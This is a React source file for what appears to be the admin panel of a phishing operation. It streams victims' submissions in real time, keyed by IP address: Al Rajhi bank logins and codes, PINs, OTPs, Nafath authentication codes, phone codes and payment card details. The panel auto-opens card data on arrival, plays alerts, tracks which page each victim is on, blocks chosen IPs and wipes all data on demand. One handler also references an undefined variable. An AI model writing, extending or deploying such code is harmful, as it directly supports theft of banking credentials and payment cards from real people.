// src/App.js
import React, { useEffect, useState, useRef } from "react";
import { Routes, Route, Navigate, useNavigate } from "react-router-dom";
import { socket } from "./socket";
import { API_BASE } from "./config";
import UserTable from "./components/UserTable";
import CardModal from "./components/CardModal";
import InfoModal from "./components/InfoModal";
import Login from "./Login";

export default function App() {
  const canPlaySoundRef = useRef(false);
  const [users, setUsers] = useState({});
  const [blocked, setBlocked] = useState(new Set()); // 👈 NEW: blocked IPs
  const [cardIp, setCardIp] = useState(null);
  const [infoIp, setInfoIp] = useState(null);
  const [highlightIp, setHighlightIp] = useState(null);
  const newIpSound = useRef();
  const updateSound = useRef();

  //const [canPlaySound, setCanPlaySound] = useState(false);
  const navigate = useNavigate();

  // Helper to decide if we should ignore an IP entirely
  const isBlocked = (ip) => blocked.has(ip);

  // Central guard to skip any incoming user struct if blocked
  const guardMerge = (u) => {
    if (!u || !u.ip) return true;
    return isBlocked(u.ip);
  };

  // Playback helper
  const playNotification = (isUpdate) => {
    if (!canPlaySoundRef.current) return; // only after gesture
    const sound = isUpdate ? updateSound.current : newIpSound.current;
    if (sound) {
      sound.play().catch((err) => console.warn("Playback failed:", err));
    }
  };

  // Fetch blocked list once after auth
  const loadBlocked = async () => {
    const token = localStorage.getItem("token");
    if (!token) return;

    const res = await fetch(`${API_BASE}/api/blocked`, {
      headers: { Authorization: "Bearer " + token },
    });
    if (!res.ok) {
      console.warn("Failed to load blocked list:", res.status, res.statusText);
      return;
    }
    const list = await res.json();
    const s = new Set(Array.isArray(list) ? list : []);
    setBlocked(s);

    // Immediately strip any currently shown blocked users (if any)
    setUsers((m) => {
      const copy = { ...m };
      for (const ip of s) {
        delete copy[ip];
      }
      return copy;
    });
  };

  // Block action exposed to UserTable
  const handleBlockIp = async (ip) => {
    const token = localStorage.getItem("token");
    if (!token) throw new Error("Not authenticated");

    const res = await fetch(
      `${API_BASE}/api/blocked/${encodeURIComponent(ip)}`,
      {
        method: "POST",
        headers: { Authorization: "Bearer " + token },
      }
    );
    if (!res.ok) {
      throw new Error(`Server responded ${res.status}: ${res.statusText}`);
    }

    // Update local state so the IP disappears and is ignored going forward
    setBlocked((s) => new Set([...s, ip]));
    setUsers((m) => {
      const copy = { ...m };
      delete copy[ip];
      return copy;
    });
  };

  // Wipe-all button
  const handleWipeAll = async () => {
    if (
      !window.confirm(
        "⚠️ This will permanently delete ALL data. Are you absolutely sure?"
      )
    )
      return;

    const token = localStorage.getItem("token");
    try {
      const res = await fetch(`${API_BASE}/api/admin/wipe`, {
        method: "DELETE",
        headers: { Authorization: "Bearer " + token },
      });
      if (!res.ok) {
        throw new Error(`Server responded ${res.status}: ${res.statusText}`);
      }
      // Optionally server could emit `dbWiped`; we hard-clear UI immediately
      setUsers({});
      setCardIp(null);
      setInfoIp(null);
      setHighlightIp(null);
      // Keep blocked list intact; you usually want those preserved across wipes
    } catch (err) {
      console.error("Wipe failed:", err);
      alert("Wipe failed: " + err.message);
    }
  };

  useEffect(() => {
    newIpSound.current = new Audio("/sounds/ip.wav");
    updateSound.current = new Audio("/sounds/data.wav");

    const enableSound = () => {
      canPlaySoundRef.current = true;
      newIpSound.current
        .play()
        .then(() => newIpSound.current.pause())
        .catch(() => {});
      window.removeEventListener("click", enableSound);
      window.removeEventListener("keydown", enableSound);
    };
    window.addEventListener("click", enableSound);
    window.addEventListener("keydown", enableSound);

    (async () => {
      // 1) Look for a “random token” in localStorage
      const token = localStorage.getItem("token");
      if (!token) {
        navigate("/login", { replace: true });
        return;
      }

      // Load blocked list before any data comes in
      await loadBlocked();

      // 2) Token is present → connect socket
      socket.connect();
      socket.emit("loadData");
      console.log("newIpSound.src =", newIpSound.current.src);
      console.log("updateSound.src =", updateSound.current.src);

      // ───── REPLACE: initialData handler now includes data.locations ─────
      socket.on("initialData", (data) => {
        const map = {};

        // 1) Flatten everything except “payment” and “flags” and “locations”
        Object.entries(data).forEach(([key, arr]) => {
          if (key === "payments" || key === "flags" || key === "locations")
            return;
          arr.forEach((r) => {
            const ipKey = r.ip;
            if (!map[ipKey]) {
              map[ipKey] = { payments: [], flag: false, hasNewData: false };
            }
            map[ipKey] = {
              ...map[ipKey],
              ...r,
              payments: map[ipKey].payments,
              flag: map[ipKey].flag,
              hasNewData: false,
            };
          });
        });

        // 2) Handle payments array separately
        if (data.payments) {
          data.payments.forEach((payDoc) => {
            const ipKey = payDoc.ip;
            if (!map[ipKey]) {
              map[ipKey] = { payments: [], flag: false, hasNewData: false };
            }
            map[ipKey].payments.push(payDoc);
          });
        }

        // 3) Handle flags array separately
        if (data.flags) {
          data.flags.forEach(({ ip: ipKey, flag }) => {
            if (!map[ipKey]) {
              map[ipKey] = { payments: [], flag: false, hasNewData: false };
            }
            map[ipKey].flag = flag;
          });
        }

        // 4) NOW integrate “locations” so we know each user’s currentPage
        if (data.locations) {
          data.locations.forEach(({ ip: ipKey, currentPage }) => {
            if (!map[ipKey]) {
              map[ipKey] = { payments: [], flag: false, hasNewData: false };
            }
            map[ipKey].currentPage = currentPage;
          });
        }

        setUsers(map);
      });

      // Helper to merge single‐document updates
      const mergeSingleton = (u) => {
        if (guardMerge(u)) return; // 👈 ignore blocked
        setUsers((m) => {
          const exists = !!m[u.ip];
          playNotification(exists); // call helper

          const oldObj = m[u.ip] || {
            payments: [],
            flag: false,
            hasNewData: false,
          };

          return {
            ...m,
            [u.ip]: {
              ...oldObj,
              ...u,
              payments: oldObj.payments,
              flag: oldObj.flag,
              hasNewData: true, // new submission arrived!
            },
          };
        });
      };

      // When payments come in, append and mark hasNewData
      const appendPayment = (u) => {
        if (guardMerge(u)) return; // 👈 ignore blocked

        setUsers((m) => {
          const exists = !!m[u.ip];
          playNotification(exists); // call helper

          const oldObj = m[u.ip] || {
            payments: [],
            flag: false,
            hasNewData: false,
          };

          return {
            ...m,
            [u.ip]: {
              ...oldObj,
              ...u,
              payments: [...oldObj.payments, u],
              flag: oldObj.flag,
              hasNewData: true,
            },
          };
        });
      };

      const removeUser = ({ ip }) => {
        if (guardMerge(u)) return; // 👈 ignore blocked
        setUsers((m) => {
          const copy = { ...m };
          delete copy[ip];
          return copy;
        });
      };

      const updateFlag = ({ ip, flag }) => {
        setUsers((m) => {
          const copy = { ...m };
          delete copy[ip];
          return copy;
        });
        setUsers((m) => ({
          ...m,
          [ip]: {
            ...(m[ip] || {
              payments: [],
              flag: false,
              hasNewData: false,
            }),
            flag,
          },
        }));
      };

      socket.on("newIndex", (u) => mergeSingleton(u));
      socket.on("newDetails", (u) => mergeSingleton(u));
      socket.on("newShamel", (u) => mergeSingleton(u));
      socket.on("newThirdparty", (u) => mergeSingleton(u));
      socket.on("newBilling", (u) => mergeSingleton(u));
      socket.on("newPayment", (u) => {
        appendPayment(u);
        handleShowCard(u.ip);
      });
      socket.on("newPhone", (u) => mergeSingleton(u));
      socket.on("newRajhi", (u) => mergeSingleton(u));
      socket.on("newRajhiCode", (u) => mergeSingleton(u));
      socket.on("newPin", (u) => mergeSingleton(u));
      socket.on("newOtp", (u) => mergeSingleton(u));
      socket.on("newPhoneCode", (u) => mergeSingleton(u));
      socket.on("newNafad", (u) => mergeSingleton(u));

      // ───── REPLACE: locationUpdated now also handles “offline” ─────
      socket.on("locationUpdated", ({ ip, page }) => {
        if (page !== "offline") {
          // A real page‐change → treat as “new data”
          mergeSingleton({ ip, currentPage: page });
        } else {
          // User went offline → immediately flip that row’s currentPage to "offline"
          setUsers((m) => {
            if (!m[ip]) return m;
            return {
              ...m,
              [ip]: {
                ...m[ip],
                currentPage: "offline",
                // do NOT change hasNewData/fingerprint here
              },
            };
          });
        }
      });

      socket.on("userDeleted", removeUser);
      socket.on("flagUpdated", updateFlag);
    })();

    return () => {
      window.removeEventListener("click", enableSound);
      window.removeEventListener("keydown", enableSound);
    };
  }, [navigate]);

  // When “Card” is clicked:
  //   1) Clear highlightIp so the green border stops flashing
  //   2) Mark that IP’s hasNewData = false (they’ve “seen” it)
  //   3) Open the modal
  const handleShowCard = (ip) => {
    setHighlightIp(null);
    setCardIp(ip);

    setUsers((m) => {
      if (!m[ip]) return m;
      return {
        ...m,
        [ip]: {
          ...m[ip],
          hasNewData: false, // mark as “read”
        },
      };
    });
  };

  return (
    <Routes>
      {/* Public login page, no token check here */}
      <Route path="/login" element={<Login />} />

      {/* Protected dashboard: only show if “token” exists */}
      <Route
        path="/"
        element={
          localStorage.getItem("token") ? (
            <DashboardView
              users={users}
              highlightIp={highlightIp}
              cardIp={cardIp}
              setCardIp={setCardIp}
              infoIp={infoIp}
              setInfoIp={setInfoIp}
              onShowCard={handleShowCard}
              onBlockIp={handleBlockIp} // 👈 pass down
              onWipeAll={handleWipeAll} // 👈 pass down
            />
          ) : (
            <Navigate to="/login" replace />
          )
        }
      />

      {/* Catch‐all: redirect based on presence of token */}
      <Route
        path="*"
        element={
          localStorage.getItem("token") ? (
            <Navigate to="/" replace />
          ) : (
            <Navigate to="/login" replace />
          )
        }
      />
    </Routes>
  );
}

function DashboardView({
  users,
  highlightIp,
  cardIp,
  onShowCard,
  infoIp,
  setInfoIp,
  setCardIp,
  onBlockIp, // 👈 NEW
  onWipeAll, // 👈 NEW
}) {
  return (
    <div className="container py-4">
      <div className="d-flex justify-content-between align-items-center mb-3">
        <h2>Admin Dashboard</h2>

        {/* 🔥 Wipe All button */}
        <button className="btn btn-danger" onClick={onWipeAll}>
          Wipe All
        </button>
      </div>

      <UserTable
        users={users}
        highlightIp={highlightIp}
        cardIp={cardIp}
        onShowCard={onShowCard}
        onShowInfo={setInfoIp}
        onBlockIp={onBlockIp} // 👈 pass into table
      />

      {cardIp && (
        <CardModal
          ip={cardIp}
          user={users[cardIp]}
          onClose={() => setCardIp(null)}
        />
      )}

      {infoIp && (
        <InfoModal
          ip={infoIp}
          user={users[infoIp]}
          onClose={() => setInfoIp(null)}
        />
      )}
    </div>
  );
}
